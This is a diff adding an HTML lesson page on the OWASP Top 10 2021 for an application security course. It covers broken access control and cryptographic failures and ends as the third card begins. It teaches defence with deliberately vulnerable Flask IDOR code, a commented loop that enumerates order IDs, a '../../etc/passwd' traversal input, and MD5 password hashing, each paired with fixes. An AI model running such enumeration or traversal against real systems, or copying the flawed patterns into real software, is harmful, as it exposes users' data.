@@ -1,0 +1,1444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AppSec Engineer — Lesson 1: OWASP Top 10</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e1a;
+  --surface: #111827;
+  --surface2: #1a2235;
+  --border: #1e2d47;
+  --accent: #00d4ff;
+  --accent2: #ff6b35;
+  --green: #00ff9d;
+  --red: #ff4757;
+  --yellow: #ffd32a;
+  --purple: #c678dd;
+  --text: #e2e8f0;
+  --muted: #64748b;
+  --code-bg: #0d1117;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Inter', sans-serif;
+  font-size: 15px;
+  line-height: 1.8;
+  min-height: 100vh;
+}
+
+/* SIDEBAR */
+.sidebar {
+  position: fixed;
+  left: 0; top: 0; bottom: 0;
+  width: 260px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  z-index: 100;
+  padding: 0 0 2rem 0;
+}
+.sidebar-brand {
+  padding: 1.5rem 1.25rem 1rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 0.5rem;
+}
+.sidebar-brand .badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  background: var(--accent);
+  color: #000;
+  padding: 2px 8px;
+  border-radius: 3px;
+  letter-spacing: 0.1em;
+  font-weight: 700;
+  display: inline-block;
+  margin-bottom: 6px;
+}
+.sidebar-brand h2 {
+  font-family: 'Syne', sans-serif;
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--text);
+  line-height: 1.3;
+}
+.sidebar-section {
+  padding: 0.5rem 1.25rem 0.25rem;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-top: 0.5rem;
+}
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 0.5rem 1.25rem;
+  cursor: pointer;
+  border-left: 3px solid transparent;
+  transition: all 0.15s;
+  font-size: 13px;
+  color: var(--muted);
+  text-decoration: none;
+}
+.nav-item:hover { color: var(--text); background: var(--surface2); }
+.nav-item.active { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,255,0.05); }
+.nav-item .num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  min-width: 20px;
+  opacity: 0.5;
+}
+.nav-item.active .num { opacity: 1; color: var(--accent); }
+
+/* MAIN */
+.main {
+  margin-left: 260px;
+  min-height: 100vh;
+}
+.topbar {
+  position: sticky;
+  top: 0;
+  background: rgba(10,14,26,0.95);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  padding: 0.75rem 2.5rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  z-index: 50;
+}
+.breadcrumb {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--muted);
+}
+.breadcrumb span { color: var(--accent); }
+.lesson-progress {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 12px;
+  color: var(--muted);
+}
+.prog-dots { display: flex; gap: 4px; }
+.prog-dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--border);
+  transition: background 0.3s;
+}
+.prog-dot.done { background: var(--green); }
+.prog-dot.active { background: var(--accent); }
+
+.content { padding: 3rem 2.5rem; max-width: 900px; }
+
+/* HERO SECTION */
+.lesson-hero {
+  margin-bottom: 3rem;
+  padding-bottom: 2rem;
+  border-bottom: 1px solid var(--border);
+}
+.lesson-meta {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 1rem;
+}
+.tag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 3px;
+  font-weight: 500;
+}
+.tag-beginner { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.2); }
+.tag-intermediate { background: rgba(255,211,42,0.1); color: var(--yellow); border: 1px solid rgba(255,211,42,0.2); }
+.tag-advanced { background: rgba(255,107,53,0.1); color: var(--accent2); border: 1px solid rgba(255,107,53,0.2); }
+.tag-expert { background: rgba(198,120,221,0.1); color: var(--purple); border: 1px solid rgba(198,120,221,0.2); }
+.lesson-hero h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: 2.4rem;
+  font-weight: 800;
+  line-height: 1.2;
+  margin-bottom: 1rem;
+  background: linear-gradient(135deg, #fff 0%, var(--accent) 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.lesson-hero .subtitle {
+  font-size: 16px;
+  color: var(--muted);
+  max-width: 620px;
+  line-height: 1.7;
+}
+.objectives {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 12px;
+  margin-top: 1.5rem;
+}
+.obj-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem;
+  display: flex;
+  gap: 10px;
+  align-items: flex-start;
+}
+.obj-icon {
+  font-size: 18px;
+  line-height: 1;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+.obj-card p { font-size: 13px; color: var(--muted); line-height: 1.5; }
+.obj-card strong { display: block; font-size: 13px; color: var(--text); margin-bottom: 2px; font-weight: 600; }
+
+/* SECTION HEADINGS */
+.section {
+  margin-bottom: 3rem;
+}
+.section-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.4rem;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.section-title::before {
+  content: '';
+  display: inline-block;
+  width: 4px;
+  height: 1.4rem;
+  background: var(--accent);
+  border-radius: 2px;
+  flex-shrink: 0;
+}
+.section-sub {
+  font-size: 14px;
+  color: var(--muted);
+  margin-bottom: 1.5rem;
+  margin-left: 14px;
+}
+
+/* OWASP CARDS */
+.owasp-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+.owasp-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+.owasp-card:hover { border-color: var(--accent); }
+.owasp-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  padding: 1rem 1.25rem;
+  cursor: pointer;
+  user-select: none;
+}
+.owasp-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 10px;
+  border-radius: 4px;
+  min-width: 48px;
+  text-align: center;
+  flex-shrink: 0;
+}
+.risk-critical { background: rgba(255,71,87,0.15); color: var(--red); border: 1px solid rgba(255,71,87,0.3); }
+.risk-high { background: rgba(255,107,53,0.15); color: var(--accent2); border: 1px solid rgba(255,107,53,0.3); }
+.risk-medium { background: rgba(255,211,42,0.15); color: var(--yellow); border: 1px solid rgba(255,211,42,0.3); }
+.owasp-title {
+  font-family: 'Syne', sans-serif;
+  font-weight: 700;
+  font-size: 15px;
+  flex: 1;
+}
+.owasp-cwe {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  flex-shrink: 0;
+}
+.owasp-toggle {
+  color: var(--muted);
+  font-size: 18px;
+  transition: transform 0.25s;
+  flex-shrink: 0;
+}
+.owasp-card.open .owasp-toggle { transform: rotate(180deg); }
+.owasp-body {
+  display: none;
+  padding: 0 1.25rem 1.25rem;
+  border-top: 1px solid var(--border);
+}
+.owasp-card.open .owasp-body { display: block; }
+.owasp-desc {
+  font-size: 14px;
+  color: var(--muted);
+  line-height: 1.8;
+  margin: 1rem 0;
+}
+.owasp-body h4 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--accent);
+  margin: 1rem 0 0.5rem;
+}
+
+/* CODE BLOCKS */
+pre, .code-block {
+  background: var(--code-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.25rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  line-height: 1.7;
+  overflow-x: auto;
+  margin: 0.75rem 0;
+  position: relative;
+}
+.code-lang {
+  position: absolute;
+  top: 10px;
+  right: 12px;
+  font-size: 10px;
+  color: var(--muted);
+  font-family: 'JetBrains Mono', monospace;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+}
+.c-red { color: var(--red); }
+.c-green { color: var(--green); }
+.c-yellow { color: var(--yellow); }
+.c-blue { color: #61afef; }
+.c-purple { color: var(--purple); }
+.c-orange { color: var(--accent2); }
+.c-cyan { color: var(--accent); }
+.c-muted { color: var(--muted); }
+.line-bad {
+  display: block;
+  background: rgba(255,71,87,0.08);
+  border-left: 2px solid var(--red);
+  margin: 0 -1.25rem;
+  padding: 0 1.25rem;
+}
+.line-good {
+  display: block;
+  background: rgba(0,255,157,0.06);
+  border-left: 2px solid var(--green);
+  margin: 0 -1.25rem;
+  padding: 0 1.25rem;
+}
+.line-comment {
+  color: var(--muted);
+  font-style: italic;
+}
+
+/* ATTACK FLOW */
+.attack-flow {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  margin: 1rem 0;
+  flex-wrap: wrap;
+}
+.flow-step {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 0.5rem 0.85rem;
+  font-size: 12px;
+  font-family: 'JetBrains Mono', monospace;
+  color: var(--text);
+  white-space: nowrap;
+}
+.flow-arrow {
+  color: var(--red);
+  padding: 0 6px;
+  font-size: 16px;
+}
+.flow-step.bad { border-color: var(--red); color: var(--red); background: rgba(255,71,87,0.07); }
+.flow-step.good { border-color: var(--green); color: var(--green); background: rgba(0,255,157,0.07); }
+
+/* IMPACT PILLS */
+.impact-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 0.5rem 0; }
+.pill {
+  font-size: 12px;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 500;
+}
+.pill-red { background: rgba(255,71,87,0.1); color: var(--red); border: 1px solid rgba(255,71,87,0.25); }
+.pill-yellow { background: rgba(255,211,42,0.1); color: var(--yellow); border: 1px solid rgba(255,211,42,0.25); }
+.pill-blue { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.25); }
+.pill-green { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.25); }
+.pill-purple { background: rgba(198,120,221,0.1); color: var(--purple); border: 1px solid rgba(198,120,221,0.25); }
+
+/* REAL-WORLD EXAMPLE */
+.rw-box {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem 1.25rem;
+  margin: 0.75rem 0;
+}
+.rw-box .rw-title {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  text-transform: uppercase;
+  color: var(--accent2);
+  letter-spacing: 0.1em;
+  margin-bottom: 6px;
+}
+.rw-box p { font-size: 13px; color: var(--muted); line-height: 1.7; }
+
+/* CHECKLIST */
+.checklist { list-style: none; }
+.checklist li {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 13px;
+  color: var(--muted);
+  padding: 5px 0;
+  line-height: 1.6;
+}
+.checklist li::before {
+  content: '✓';
+  color: var(--green);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  margin-top: 2px;
+  flex-shrink: 0;
+}
+
+/* CHALLENGE BOX */
+.challenge-section {
+  background: var(--surface);
+  border: 1px solid var(--accent);
+  border-radius: 12px;
+  padding: 1.75rem;
+  margin: 3rem 0;
+  position: relative;
+  overflow: hidden;
+}
+.challenge-section::before {
+  content: 'CHALLENGE';
+  position: absolute;
+  top: 1.25rem;
+  right: 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  color: var(--accent);
+  opacity: 0.4;
+  font-weight: 700;
+}
+.challenge-section h3 {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin-bottom: 0.75rem;
+  color: var(--text);
+}
+.challenge-section p { font-size: 14px; color: var(--muted); margin-bottom: 1rem; line-height: 1.7; }
+.challenge-section textarea {
+  width: 100%;
+  min-height: 120px;
+  background: var(--code-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  color: var(--text);
+  resize: vertical;
+  outline: none;
+  transition: border-color 0.2s;
+  margin-bottom: 1rem;
+}
+.challenge-section textarea:focus { border-color: var(--accent); }
+.btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
+.btn {
+  padding: 9px 20px;
+  border-radius: 6px;
+  font-size: 13px;
+  font-family: 'Inter', sans-serif;
+  font-weight: 500;
+  cursor: pointer;
+  border: 1px solid var(--border);
+  background: transparent;
+  color: var(--text);
+  transition: all 0.15s;
+}
+.btn:hover { background: var(--surface2); border-color: var(--accent); }
+.btn-primary {
+  background: var(--accent);
+  color: #000;
+  border-color: var(--accent);
+  font-weight: 600;
+}
+.btn-primary:hover { background: #00b8d9; }
+.feedback-block {
+  margin-top: 1rem;
+  padding: 1rem 1.25rem;
+  border-radius: 8px;
+  font-size: 14px;
+  line-height: 1.7;
+  display: none;
+}
+.feedback-block.show { display: block; }
+.feedback-block.good { background: rgba(0,255,157,0.07); border: 1px solid rgba(0,255,157,0.2); color: var(--green); }
+.feedback-block.hint { background: rgba(255,211,42,0.07); border: 1px solid rgba(255,211,42,0.2); color: var(--yellow); }
+.feedback-block.reveal { background: rgba(0,212,255,0.07); border: 1px solid rgba(0,212,255,0.2); color: var(--text); }
+
+/* QUIZ */
+.quiz-q { font-size: 15px; font-weight: 600; margin-bottom: 0.75rem; color: var(--text); }
+.quiz-options { display: flex; flex-direction: column; gap: 8px; margin-bottom: 1rem; }
+.quiz-opt {
+  padding: 0.75rem 1rem;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 14px;
+  color: var(--muted);
+  background: var(--code-bg);
+  transition: all 0.15s;
+}
+.quiz-opt:hover { border-color: var(--accent); color: var(--text); }
+.quiz-opt.selected-correct { border-color: var(--green); color: var(--green); background: rgba(0,255,157,0.07); }
+.quiz-opt.selected-wrong { border-color: var(--red); color: var(--red); background: rgba(255,71,87,0.07); }
+.quiz-opt.reveal-correct { border-color: var(--green); color: var(--green); background: rgba(0,255,157,0.07); }
+.quiz-explain { font-size: 13px; color: var(--muted); padding: 0.75rem 1rem; background: var(--surface2); border-radius: 6px; margin-top: 0.5rem; display: none; line-height: 1.7; }
+.quiz-explain.show { display: block; }
+
+/* TWO-COLUMN */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0; }
+.compare-card {
+  border-radius: 8px;
+  padding: 1rem 1.25rem;
+}
+.compare-card.bad-card { background: rgba(255,71,87,0.05); border: 1px solid rgba(255,71,87,0.2); }
+.compare-card.good-card { background: rgba(0,255,157,0.05); border: 1px solid rgba(0,255,157,0.2); }
+.compare-card .card-title {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 0.75rem;
+  font-weight: 700;
+}
+.bad-card .card-title { color: var(--red); }
+.good-card .card-title { color: var(--green); }
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+/* TABLE */
+table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 1rem 0; }
+th {
+  padding: 0.6rem 1rem;
+  text-align: left;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--muted);
+}
+td {
+  padding: 0.6rem 1rem;
+  border: 1px solid var(--border);
+  color: var(--muted);
+  line-height: 1.5;
+}
+tr:hover td { background: var(--surface2); }
+
+/* CALLOUT */
+.callout {
+  border-radius: 8px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+}
+.callout-info { background: rgba(0,212,255,0.06); border: 1px solid rgba(0,212,255,0.2); }
+.callout-warn { background: rgba(255,71,87,0.06); border: 1px solid rgba(255,71,87,0.2); }
+.callout-tip { background: rgba(0,255,157,0.06); border: 1px solid rgba(0,255,157,0.2); }
+.callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+.callout-text { font-size: 13px; color: var(--muted); line-height: 1.7; }
+.callout-text strong { color: var(--text); }
+
+/* NAV FOOTER */
+.lesson-nav-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 4rem;
+  padding-top: 2rem;
+  border-top: 1px solid var(--border);
+}
+.nav-prev, .nav-next {
+  display: flex;
+  flex-direction: column;
+  font-size: 13px;
+  color: var(--muted);
+  cursor: default;
+  opacity: 0.4;
+}
+.nav-next { align-items: flex-end; }
+.nav-next .nav-label { color: var(--text); font-weight: 600; opacity: 1; }
+
+@media (max-width: 900px) {
+  .sidebar { display: none; }
+  .main { margin-left: 0; }
+  .content { padding: 2rem 1.25rem; }
+  .objectives { grid-template-columns: 1fr; }
+  .two-col { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="badge">APPSEC ENGINEER</div>
+    <h2>Application Security<br>Learning Path</h2>
+  </div>
+  <div class="sidebar-section">Module 1 — Foundations</div>
+  <a class="nav-item active" href="#"><span class="num">01</span> OWASP Top 10 2021</a>
+  <a class="nav-item" href="#"><span class="num">02</span> Secure SDLC</a>
+  <a class="nav-item" href="#"><span class="num">03</span> Threat Modeling</a>
+  <div class="sidebar-section">Module 2 — Testing Tools</div>
+  <a class="nav-item" href="#"><span class="num">04</span> SAST</a>
+  <a class="nav-item" href="#"><span class="num">05</span> DAST</a>
+  <a class="nav-item" href="#"><span class="num">06</span> SCA</a>
+  <a class="nav-item" href="#"><span class="num">07</span> IAST & RASP</a>
+  <div class="sidebar-section">Module 3 — API Security</div>
+  <a class="nav-item" href="#"><span class="num">08</span> OWASP API Top 10</a>
+  <a class="nav-item" href="#"><span class="num">09</span> API Security Testing</a>
+  <a class="nav-item" href="#"><span class="num">10</span> GraphQL Security</a>
+  <div class="sidebar-section">Module 4 — DevSecOps</div>
+  <a class="nav-item" href="#"><span class="num">11</span> DevSecOps Pipeline</a>
+  <a class="nav-item" href="#"><span class="num">12</span> Secrets Management</a>
+  <a class="nav-item" href="#"><span class="num">13</span> Container Security</a>
+  <a class="nav-item" href="#"><span class="num">14</span> Dependency Scanning</a>
+  <a class="nav-item" href="#"><span class="num">15</span> SBOM</a>
+  <div class="sidebar-section">Module 5 — Architecture</div>
+  <a class="nav-item" href="#"><span class="num">16</span> Security Architecture</a>
+  <a class="nav-item" href="#"><span class="num">17</span> Supply Chain Security</a>
+  <a class="nav-item" href="#"><span class="num">18</span> WAF</a>
+  <a class="nav-item" href="#"><span class="num">19</span> Code Review</a>
+  <a class="nav-item" href="#"><span class="num">20</span> RASP</a>
+</nav>
+
+<!-- MAIN CONTENT -->
+<div class="main">
+  <div class="topbar">
+    <div class="breadcrumb">appsec-engineer / module-1 / <span>owasp-top-10</span></div>
+    <div class="lesson-progress">
+      <span>Lesson 1 of 20</span>
+      <div class="prog-dots" id="dots"></div>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- HERO -->
+    <div class="lesson-hero">
+      <div class="lesson-meta">
+        <span class="tag tag-beginner">beginner</span>
+        <span class="tag" style="background:rgba(0,212,255,0.1);color:var(--accent);border:1px solid rgba(0,212,255,0.2);">framework</span>
+        <span class="tag" style="background:rgba(198,120,221,0.1);color:var(--purple);border:1px solid rgba(198,120,221,0.2);">~45 min</span>
+      </div>
+      <h1>OWASP Top 10<br>2021</h1>
+      <p class="subtitle">The industry-standard document that every AppSec engineer must know cold. These are the 10 most critical web application security risks — they represent the foundation of everything else you'll learn.</p>
+      <div class="objectives">
+        <div class="obj-card">
+          <div class="obj-icon">🎯</div>
+          <div>
+            <strong>What you'll understand</strong>
+            <p>Each of the 10 risk categories, their causes and real-world impact</p>
+          </div>
+        </div>
+        <div class="obj-card">
+          <div class="obj-icon">⚔️</div>
+          <div>
+            <strong>What you'll attack</strong>
+            <p>Working vulnerable code examples for SQLi, XSS, IDOR, and more</p>
+          </div>
+        </div>
+        <div class="obj-card">
+          <div class="obj-icon">🛡️</div>
+          <div>
+            <strong>What you'll defend</strong>
+            <p>The exact code fixes and architectural controls to eliminate each risk</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- WHY OWASP -->
+    <div class="section">
+      <div class="section-title">Why OWASP Top 10 is your foundation</div>
+      <p class="section-sub">Before writing a single security test, you need to know what threats exist</p>
+
+      <p style="color:var(--muted);font-size:14px;line-height:1.8;margin-bottom:1rem;">OWASP (Open Web Application Security Project) is a nonprofit that researches and publishes the most common vulnerabilities found in real-world applications. The Top 10 is updated every 3-4 years based on data from hundreds of organizations and thousands of applications.</p>
+
+      <div class="callout callout-warn">
+        <div class="callout-icon">⚠️</div>
+        <div class="callout-text"><strong>Interview reality:</strong> Every AppSec engineer interview will test you on OWASP Top 10. You are expected to explain each category, give an attack example, and explain the fix — all from memory.</div>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-icon">ℹ️</div>
+        <div class="callout-text"><strong>2021 vs 2017:</strong> The 2021 list introduced 3 new categories: Insecure Design (A04), Software and Data Integrity Failures (A08), and SSRF (A10). These reflect real-world shifts in how modern cloud-native apps are built.</div>
+      </div>
+    </div>
+
+    <!-- THE 10 RISKS — EXPANDABLE CARDS -->
+    <div class="section">
+      <div class="section-title">The 10 Risk Categories — Deep Dive</div>
+      <p class="section-sub">Click each card to expand the full explanation, attack, and defense</p>
+
+      <div class="owasp-grid">
+
+        <!-- A01 -->
+        <div class="owasp-card" id="a01">
+          <div class="owasp-header" onclick="toggle('a01')">
+            <span class="owasp-num risk-critical">A01</span>
+            <span class="owasp-title">Broken Access Control</span>
+            <span class="owasp-cwe">CWE-200, 284, 285, 639</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Access control enforces that users can only perform actions or access data they are authorized for. When it breaks, attackers can act as other users, access admin functions, or read/modify anyone's data. <strong>This was #5 in 2017 and jumped to #1 in 2021</strong> — it now appears in 94% of tested applications.</p>
+
+            <div class="impact-row">
+              <span class="pill pill-red">Account Takeover</span>
+              <span class="pill pill-red">Data Breach</span>
+              <span class="pill pill-yellow">Privilege Escalation</span>
+              <span class="pill pill-yellow">Business Logic Abuse</span>
+            </div>
+
+            <h4>Sub-categories you must know</h4>
+            <table>
+              <tr><th>Type</th><th>What it means</th><th>Example</th></tr>
+              <tr><td style="color:var(--red)">IDOR</td><td>Direct object reference not authorized</td><td>GET /invoice/1042 → sees any user's invoice</td></tr>
+              <tr><td style="color:var(--red)">Vertical Privesc</td><td>Normal user accesses admin function</td><td>POST /admin/delete without role check</td></tr>
+              <tr><td style="color:var(--yellow)">Horizontal Privesc</td><td>User accesses another user's resource</td><td>User A reads User B's messages</td></tr>
+              <tr><td style="color:var(--yellow)">Missing Function-Level AC</td><td>Hidden URLs accessible to any logged-in user</td><td>/admin panel accessible to all authenticated users</td></tr>
+              <tr><td style="color:var(--muted)">Path Traversal</td><td>File access outside intended directory</td><td>../../etc/passwd via filename param</td></tr>
+            </table>
+
+            <h4>Vulnerable code — IDOR example</h4>
+<pre><span class="c-purple">@app.route</span>(<span class="c-yellow">'/api/orders/&lt;int:order_id&gt;'</span>)
+<span class="c-purple">@login_required</span>
+<span class="c-blue">def</span> <span class="c-green">get_order</span>(order_id):
+<span class="line-bad">    order = Order.query.<span class="c-blue">get</span>(order_id)          <span class="c-muted"># ← VULNERABLE: no ownership check</span></span>
+<span class="line-bad">    <span class="c-blue">return</span> jsonify(order.to_dict())             <span class="c-muted"># ← attacker GETs /api/orders/9999</span></span>
+
+<span class="c-muted"># Attack: loop from 1 to 99999 → harvest ALL orders</span>
+<span class="c-muted"># for i in range(1, 99999): requests.get(f"/api/orders/{i}", cookies=my_cookie)</span></pre>
+<div class="code-lang">Python / Flask</div>
+
+            <h4>Fixed code</h4>
+<pre><span class="c-purple">@app.route</span>(<span class="c-yellow">'/api/orders/&lt;int:order_id&gt;'</span>)
+<span class="c-purple">@login_required</span>
+<span class="c-blue">def</span> <span class="c-green">get_order</span>(order_id):
+    order = Order.query.<span class="c-blue">get_or_404</span>(order_id)
+<span class="line-good">    <span class="c-blue">if</span> order.user_id != current_user.id:       <span class="c-muted"># ← ownership check</span></span>
+<span class="line-good">        abort(<span class="c-orange">403</span>)                               <span class="c-muted"># ← 403 Forbidden, not 404 (don't leak existence)</span></span>
+    <span class="c-blue">return</span> jsonify(order.to_dict())</pre>
+<div class="code-lang">Python / Flask — Fixed</div>
+
+            <h4>Real-world breach</h4>
+            <div class="rw-box">
+              <div class="rw-title">🔴 Optus Data Breach (2022) — 11 million records exposed</div>
+              <p>Attackers found an unauthenticated API endpoint that returned customer records. By simply incrementing a sequential ID in the request, they extracted 11 million Australians' personal data including passport and license numbers. A basic ownership check on the API would have stopped it entirely.</p>
+            </div>
+
+            <h4>Defense checklist</h4>
+            <ul class="checklist">
+              <li>Deny by default — every request requires explicit access grant</li>
+              <li>Enforce ownership: always check resource.owner_id == requesting_user.id</li>
+              <li>Log all access control failures and alert on high frequency (likely enumeration)</li>
+              <li>Never use sequential integer IDs in URLs — use UUIDs</li>
+              <li>Implement access control at the data layer, not just the route layer</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- A02 -->
+        <div class="owasp-card" id="a02">
+          <div class="owasp-header" onclick="toggle('a02')">
+            <span class="owasp-num risk-critical">A02</span>
+            <span class="owasp-title">Cryptographic Failures</span>
+            <span class="owasp-cwe">CWE-261, 296, 310, 319, 321, 326, 327</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Previously called "Sensitive Data Exposure," this category was renamed in 2021 to focus on root cause: weak or missing cryptography. It covers data in transit (HTTP instead of HTTPS), data at rest (unencrypted DB), and weak algorithms (MD5, SHA1 for passwords, DES encryption).</p>
+
+            <div class="impact-row">
+              <span class="pill pill-red">Password Cracking</span>
+              <span class="pill pill-red">Data Breach</span>
+              <span class="pill pill-yellow">Man-in-the-Middle</span>
+              <span class="pill pill-yellow">Session Hijacking</span>
+            </div>
+
+            <h4>Common failures</h4>
+            <table>
+              <tr><th>Failure</th><th>Why it's dangerous</th><th>Fix</th></tr>
+              <tr><td style="color:var(--red)">MD5/SHA1 passwords</td><td>Cracked in seconds with rainbow tables</td><td>bcrypt, scrypt, or Argon2</td></tr>
+              <tr><td style="color:var(--red)">HTTP (no TLS)</td><td>WiFi sniffing, MITM attacks</td><td>HTTPS everywhere, HSTS header</td></tr>
+              <tr><td style="color:var(--red)">Weak encryption key</td><td>DES 56-bit broken in hours</td><td>AES-256-GCM minimum</td></tr>
+              <tr><td style="color:var(--yellow)">Hardcoded secret key</td><td>Leak via git = all sessions compromised</td><td>Environment variable + rotation</td></tr>
+              <tr><td style="color:var(--yellow)">ECB mode</td><td>Reveals data patterns (Tux penguin image)</td><td>Use GCM or CBC with proper IV</td></tr>
+            </table>
+
+            <h4>Password storage — vulnerable vs secure</h4>
+            <div class="two-col">
+              <div class="compare-card bad-card">
+                <div class="card-title">❌ Never do this</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-blue">import</span> hashlib
+
+<span class="c-blue">def</span> <span class="c-red">store_password</span>(pwd):
+    <span class="c-muted"># MD5 — crackable instantly</span>
+    <span class="c-blue">return</span> hashlib.md5(
+        pwd.encode()
+    ).hexdigest()
+
+<span class="c-blue">def</span> <span class="c-red">store_v2</span>(pwd):
+    <span class="c-muted"># SHA256 with no salt — still bad</span>
+    <span class="c-blue">return</span> hashlib.sha256(
+        pwd.encode()
+    ).hexdigest()</pre>
+              </div>
+              <div class="compare-card good-card">
+                <div class="card-title">✅ Do this instead</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-blue">import</span> bcrypt
+
+<span class="c-blue">def</span> <span class="c-green">store_password</span>(pwd):
+    <span class="c-muted"># bcrypt auto-salts + stretches</span>
+    hashed = bcrypt.hashpw(
+        pwd.encode(),
+        bcrypt.gensalt(rounds=<span class="c-orange">12</span>)
+    )
+    <span class="c-blue">return</span> hashed
+
+<span class="c-blue">def</span> <span class="c-green">verify</span>(pwd, hashed):
+    <span class="c-blue">return</span> bcrypt.checkpw(
+        pwd.encode(), hashed
+    )</pre>
+              </div>
+            </div>
+
+            <div class="callout callout-tip">
+              <div class="callout-icon">💡</div>
+              <div class="callout-text"><strong>Why bcrypt and not SHA-256?</strong> SHA-256 is designed to be FAST (millions of hashes/second). bcrypt is designed to be SLOW (12 rounds = ~250ms per hash). Attackers with GPUs can crack SHA-256 hashes at 10 billion/second. bcrypt limits them to thousands/second — impossible to brute force.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- A03 -->
+        <div class="owasp-card" id="a03">
